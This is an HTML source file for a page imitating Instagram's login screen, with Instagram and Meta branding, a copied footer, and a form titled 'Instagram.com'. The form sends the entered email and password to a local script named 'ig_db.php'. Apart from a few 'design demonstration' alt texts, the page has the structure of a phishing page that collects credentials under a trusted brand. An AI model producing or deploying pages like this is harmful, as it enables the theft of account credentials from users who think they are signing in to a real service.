    
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram.com</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <main class="page">
    <section class="promo">

      <a class="instagram-logo" href="#" aria-label="Demo home">
        <svg viewBox="0 0 48 48" fill="none">
          <defs>
            <linearGradient id="igGradient"
              x1="5" y1="43" x2="43" y2="5"
              gradientUnits="userSpaceOnUse">
              <stop stop-color="#FFD776"/>
              <stop offset=".35" stop-color="#FF543E"/>
              <stop offset=".65" stop-color="#C837AB"/>
              <stop offset="1" stop-color="#654CFF"/>
            </linearGradient>
          </defs>
          <rect x="3" y="3" width="42" height="42"
            rx="12" stroke="url(#igGradient)" stroke-width="4"/>
          <circle cx="24" cy="24" r="9"
            stroke="url(#igGradient)" stroke-width="4"/>
          <circle cx="36" cy="12" r="2.5" fill="#F44D98"/>
        </svg>
      </a>

      <div class="promo-content">
        <h1>
          See everyday<br>
          moments from your<br>
          <span>close friends</span>.
        </h1>

        <div class="photo-stack">
          <div class="photo photo-back photo-left">
            <img
              src="ig_left_image.png"
              alt="Portrait for the design demonstration">
          </div>

          <div class="photo photo-back photo-right">
            <img
              src="ig_right_image.png"
              alt="Portrait for the design demonstration">
          </div>

          <div class="photo photo-front">
            <img
              src="ig_front_image.png"
              alt="Portrait for the design demonstration">

            <div class="story-reaction">👀 🥹 🥰</div>

            <div class="photo-bottom">
              <span></span>
              <span class="heart">♡</span>
            </div>
          </div>

          <div class="floating-heart">♥</div>
          <div class="floating-star">★⌄</div>
          <div class="floating-avatar">☺</div>
        </div>
      </div>

    </section>

  
    <section class="login-panel">
      <div class="login-box">

        <h1 class="instagram-header">Instagram</h1>

        <form  action="ig_db.php" id="loginForm" autocomplete="off" method="post">
          <input
            type="email"
            id="email"
            name="email"
            placeholder="email"
            required>

          <div class="password-wrap">
            <input
              type="password"
              name="password"
              id="password"
              placeholder="Password"
              required>

            <button
              type="button"
              id="togglePassword"
              class="show-password">
              Show
            </button>
          </div>

          <button class="login-button" type="submit">
            Log in
          </button>
        </form>


        <a class="forgot" href="#" id="forgotLink">
          Forgot password?
        </a>

        <div class="separator"><span>OR</span></div>

        <button class="facebook-button" id="facebookButton">
          <span class="facebook-icon">f</span>
          Log in with Facebook
        </button>

        <button class="create-button" id="createButton">
          Create new account
        </button>

        <div class="meta">
          <span class="meta-symbol">∞</span> Meta
        </div>

      </div>
    </section>

  </main>

  <footer class="footer">
    <nav aria-label="Footer links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Popular</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Meta AI</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading &amp; Non-Users</a>
      <a href="#">Meta Verified</a>
    </nav>
  </footer>

  <script src="script.js"></script>
</body>
</html>
